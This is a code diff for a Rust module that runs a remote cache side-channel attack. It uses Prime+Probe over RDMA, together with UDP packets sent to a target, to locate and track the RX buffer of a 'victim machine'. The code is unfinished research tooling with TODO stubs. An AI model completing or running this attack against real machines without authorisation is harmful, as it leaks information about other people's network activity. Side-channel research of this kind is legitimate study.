@@ -1,17 +1,26 @@
+//! # Online Tracking
+//! This module is responsible for tracking and gathering measurements on the state
+//! of the RX buffer of the victim machine.
+
+mod tracking;
+
 use crate::connection::rdma;
 use crate::rpp::{self, ColorCode, ColoredSetCode, SetCode};
 use std::collections::HashMap;
 use std::io::Result;
 use std::io::{Error, ErrorKind};
 use std::net::{ToSocketAddrs, UdpSocket};
+use tracking::{SyncStatus, TrackingContext, WINDOW_SIZE};
 
-pub const REPEATINGS: usize = 8;
+const REPEATINGS: usize = 8;
+const MEASUREMENT_CNT: usize = 10000;
 
 pub type Pattern = Vec<SetCode>;
 
 pub struct OnlineTracker {
     rpp: rpp::Rpp,
     sock: UdpSocket,
+    pattern: Pattern,
 }
 
 impl OnlineTracker {
@@ -25,10 +34,27 @@ impl OnlineTracker {
         sock.connect(addr)?;
         sock.set_nonblocking(true)?;
 
-        Ok(OnlineTracker { rpp, sock })
+        Ok(OnlineTracker {
+            rpp,
+            sock,
+            pattern: Default::default(),
+        })
     }
 
-    pub fn locate_rx(&mut self) -> Result<Pattern> {
+    // TODO: document and fill
+    pub fn track(&mut self) -> Result<()> {
+        self.locate_rx()?;
+        Ok(())
+    }
+
+    /// Locates the RX buffer in the cache. The buffer is expected to reside
+    /// on a single page and be a single for the os (sometimes there might be
+    /// multiple RX buffers)
+    /// # Fails
+    /// Fails if Prime or Probe fails, if there are issues with sending UDP
+    /// packets to the target, and if the pattern cannot be found in the set
+    /// of data.
+    fn locate_rx(&mut self) -> Result<()> {
         let mut patterns = HashMap::with_capacity(self.rpp.colors_len());
         let color_codes = self.rpp.colors().collect::<Vec<ColorCode>>();
 
@@ -44,7 +70,8 @@ impl OnlineTracker {
                 for &colored_set_code in set_codes.iter() {
                     let set_code = SetCode(color_code, colored_set_code);
                     self.rpp.prime(&set_code)?;
-                    self.send_packets()?;
+                    self.send_packet()?;
+                    self.send_packet()?;
                     pattern.push(self.rpp.probe(&set_code)?.map(|x| x.1));
                 }
             }
@@ -52,16 +79,14 @@ impl OnlineTracker {
             patterns.insert(color_code, pattern);
         }
 
-        let pattern = Self::find_pattern(patterns)?;
+        self.pattern = Self::find_pattern(patterns)?;
 
-        Ok(pattern)
+        Ok(())
     }
 
-    fn send_packets(&self) -> Result<()> {
-        let buf = [0];
-        // sending 2 packets to the remote server.
-        self.sock.send(&buf)?;
-        self.sock.send(&buf)?;
+    #[inline(always)]
+    fn send_packet(&self) -> Result<()> {
+        self.sock.send(&[0])?;
         Ok(())
     }
 
@@ -114,11 +139,11 @@ impl OnlineTracker {
     }
 
     fn pat_from_rec(rec: Vec<HashMap<ColoredSetCode, usize>>) -> Option<Vec<ColoredSetCode>> {
-        rec.into_iter().map(Self::max_repeating).collect()
+        rec.into_iter().map(Self::get_max_repeating).collect()
     }
 
     /// Return None if cannot determine most repeating element.
-    fn max_repeating(hm: HashMap<ColoredSetCode, usize>) -> Option<ColoredSetCode> {
+    fn get_max_repeating(hm: HashMap<ColoredSetCode, usize>) -> Option<ColoredSetCode> {
         if hm.is_empty() {
             return None;
         }
@@ -134,6 +159,18 @@ impl OnlineTracker {
         }
 
         Some(*colored_set_code)
+    }
+
+    fn measure(&mut self) -> Result<()> {
+        let init_pos = self.get_init_pos()?;
+        let mut ctx = TrackingContext::new(init_pos);     
+
+        for _ in 0..MEASUREMENT_CNT {
+            let es = self.window(&ctx);
+            self.rpp.prime_all(&es)?;
+
+            // TODO: measure
+        } 
     }
 }
 
